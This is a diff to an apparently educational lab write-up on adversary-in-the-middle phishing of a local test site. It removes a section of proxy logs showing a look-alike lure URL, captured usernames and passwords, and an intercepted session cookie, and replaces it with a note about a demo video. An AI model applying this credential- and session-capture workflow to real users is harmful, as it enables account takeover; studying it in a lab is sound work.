@@ -123,44 +123,10 @@ Note that I used the debug option too, since, I don't know why at the moment, th
 	https://login.targetsile.local/nBfYHrTO
 ```
 	
-## Visit the malicious URL
-
-
-## Capturing the session token
-```bash 
-: 2024/12/04 21:32:08 [001] WARN: Cannot handshake client login.targetsite.local remote error: tls: unknown certificate authority
-[21:32:33] [imp] [0] [targetsite-local] new visitor has arrived: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 (172.18.0.1)
-[21:32:33] [inf] [0] [targetsite-local] landing URL: https://login.targetsile.local/AhsTYOfa
-[21:33:14] [+++] [0] Username: [admin]
-[21:33:14] [+++] [0] Password: [test01]
-[21:33:53] [+++] [0] Username: [admin]
-[21:33:53] [+++] [0] Password: [Pwd Sicur@ 123]
-[21:33:54] [+++] [0] detected authorization URL - tokens intercepted: /admin.php
-: sessions 
-
-+-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+
-| id  |     phishlet      | username  |    password     |  tokens   | remote ip   |       time        |
-+-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+
-| 1   | targetsite-local  | admin     | Pwd Sicur@ 123  | captured  | 172.18.0.1  | 2024-12-04 21:33  |
-+-----+-------------------+-----------+-----------------+-----------+-------------+-------------------+
-
-: sessions 1
-
- id           : 1
- phishlet     : targetsite-local
- username     : admin
- password     : Pwd Sicur@ 123
- tokens       : captured
- landing url  : https://login.targetsile.local/AhsTYOfa
- user-agent   : Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
- remote ip    : 172.18.0.1
- create time  : 2024-12-04 21:32
- update time  : 2024-12-04 21:33
-
-[ cookies ]
-[{"path":"/","domain":"login.targetsite.local","expirationDate":1764884081,"value":"jkncga8d8e6fk3igla22ugsfse--very-insecure-fixed-VALUE--DO-NOT-USE-IT-NEVER-IN-REAL-APPLICATION","name":"session_token","httpOnly":true,"hostOnly":true}]
-
-```
+## Demo video
+- I use Firefox to surf the lure's site
+- I use Chromium to visit the legitimate site
+Enjoy :)
 
 ## Useful Docker commands
 
